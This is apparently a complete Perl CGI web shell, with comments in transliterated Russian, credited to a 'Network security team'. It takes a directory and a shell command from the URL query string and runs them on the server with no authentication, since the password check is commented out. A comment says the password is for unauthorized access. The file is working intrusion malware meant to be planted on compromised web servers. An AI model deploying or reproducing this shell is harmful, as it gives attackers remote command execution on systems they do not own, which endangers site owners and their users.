############################################################
## Network security team                                  ##
############################################################
##Coder: Ins                                              ##
############################################################
##Ob dannom scripte: Eto prostoj shell napisannyj na perle##
############################################################

#V celjah nesankcionirovannogo dostupa smeni etot parol`"
#$pwd='';

print "Content-type: text/html\n\n";
&read_param();
if (!defined$param{dir}){$param{dir}="/"};
if (!defined$param{cmd}){$param{cmd}="ls -la"};
##if (!defined$param{pwd}){$param{pwd}='Enter_Password'};##

print << "[ins1]";
<head>
<title>::Network Security Team::</title>
<font size=3 face=verdana><b>Network security team :: CGI Shell</b>
<font size=-2 face=verdana><br><br>
<style>
BODY, TD { font-family: Tahoma; font-size: 12px; }
INPUT.TEXT  {
font-family : Arial;
font-size : 8pt;
color : Black;
width : 100%;
background-color : #F1F1F1;
border-style : solid;
border-width : 0px;
border-color : Silver;
}
INPUT.BUTTON  {
font-family : Arial;
font-size : 8pt;
width : 100px;
border-width : 1px;
color : Black;
background-color : D1D1D1;
border-color : silver;
border-style : solid;
}
</style>
</head>
<body bgcolor=#B9B9B9>
Vvedite zapros:
<table width=500 bgcolor=D9D9D9><tr><td>
[ins1]

print "cd $param{dir}&&$param{cmd}";

print << "[ins2]";
</td></tr></table>
Otvet na zapros:
<table width=500 bgcolor=D9D9D9><tr><td><pre>
[ins2]

#if ($param{pwd} ne $pwd){print "Nepravelnij user";}
open(FILEHANDLE, "cd $param{dir}&&$param{cmd}|");
while ($line=<FILEHANDLE>){print "$line";};
close (FILEHANDLE);

print << "[ins3]";
</pre></td></tr></table>
<form action=pshell.cgi>
DIR dlja sledujushego zaprosa:
<input type=text class="TEXT" name=dir value=$param{dir}>
Sledujushij zapros:
<input type=text class="TEXT" name=cmd value=$param{cmd}>
<input type=submit class="button" value="Submit">
<input type=reset class="button" value="Reset">
</form>
</body>
</html>
[ins3]

sub read_param {
$buffer = "$ENV{'QUERY_STRING'}";
@pairs = split(/&/, $buffer);
foreach $pair (@pairs)
        {
        ($name, $value) = split(/=/, $pair);
        $name =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
        $value =~ s/\+/ /g;
        $value =~ s/%20/ /g;
        $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
        $param{$name} = $value;
        }
}

#########################<<KONEC>>#####################################
